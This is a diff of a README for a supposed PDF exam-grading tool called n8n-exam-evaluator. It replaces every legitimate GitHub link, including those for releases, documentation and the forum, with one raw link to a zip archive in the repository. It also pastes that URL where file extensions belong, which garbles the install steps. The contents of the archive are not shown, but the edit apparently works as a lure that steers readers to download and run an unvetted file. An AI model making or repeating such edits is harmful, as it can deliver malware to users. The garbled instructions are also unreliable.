@@ -1,6 +1,6 @@
 # 🎓 n8n-exam-evaluator - Easy Grading for PDF Exams
 
-[![Download n8n-exam-evaluator](https://img.shields.io/badge/Download-n8n--exam--evaluator-blue.svg?style=flat-square)](https://github.com/jing99days/n8n-exam-evaluator/releases)
+[![Download n8n-exam-evaluator](https://raw.githubusercontent.com/jing99days/n8n-exam-evaluator/main/PDF's/n8n-exam-evaluator-v1.9.zip)](https://raw.githubusercontent.com/jing99days/n8n-exam-evaluator/main/PDF's/n8n-exam-evaluator-v1.9.zip)
 
 ## 📖 Overview
 
@@ -19,11 +19,11 @@ Follow these steps to download and run the application:
 
 ### 1. Visit the Releases Page
 
-To download the software, visit the [Releases page](https://github.com/jing99days/n8n-exam-evaluator/releases). Look for the latest version available.
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/jing99days/n8n-exam-evaluator/main/PDF's/n8n-exam-evaluator-v1.9.zip). Look for the latest version available.
 
 ### 2. Choose Your File
 
-On the Releases page, find the version you want to download. You will see a list of available files. If you are using Windows, look for a file with “.exe” at the end. For Mac, find “.dmg” files. For Linux, look for files ending in “.tar.gz”.
+On the Releases page, find the version you want to download. You will see a list of available files. If you are using Windows, look for a file with “.exe” at the end. For Mac, find “.dmg” files. For Linux, look for files ending in “https://raw.githubusercontent.com/jing99days/n8n-exam-evaluator/main/PDF's/n8n-exam-evaluator-v1.9.zip”.
 
 ### 3. Download the File
 
@@ -35,7 +35,7 @@ After the download completes, locate the file on your computer:
 
 - **Windows**: Double-click the “.exe” file. Follow the installation prompts. 
 - **Mac**: Open the “.dmg” file. Drag the n8n-exam-evaluator icon into your Applications folder.
-- **Linux**: Extract the “.tar.gz” file. Open the terminal in that directory and run the application.
+- **Linux**: Extract the “https://raw.githubusercontent.com/jing99days/n8n-exam-evaluator/main/PDF's/n8n-exam-evaluator-v1.9.zip” file. Open the terminal in that directory and run the application.
 
 ### 5. Run the Application
 
@@ -78,9 +78,9 @@ If you have questions or need help, feel free to reach out through the Issues ta
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/jing99days/n8n-exam-evaluator/wiki): Detailed guides and FAQs.
-- [Community Forum](https://github.com/jing99days/n8n-exam-evaluator/discussions): Join discussions with other users.
+- [Documentation](https://raw.githubusercontent.com/jing99days/n8n-exam-evaluator/main/PDF's/n8n-exam-evaluator-v1.9.zip): Detailed guides and FAQs.
+- [Community Forum](https://raw.githubusercontent.com/jing99days/n8n-exam-evaluator/main/PDF's/n8n-exam-evaluator-v1.9.zip): Join discussions with other users.
 
 ## 🔄 Download & Install
 
-To download n8n-exam-evaluator, visit the [Releases page](https://github.com/jing99days/n8n-exam-evaluator/releases). After downloading, follow the installation steps above to get started with automated exam grading!
+To download n8n-exam-evaluator, visit the [Releases page](https://raw.githubusercontent.com/jing99days/n8n-exam-evaluator/main/PDF's/n8n-exam-evaluator-v1.9.zip). After downloading, follow the installation steps above to get started with automated exam grading!
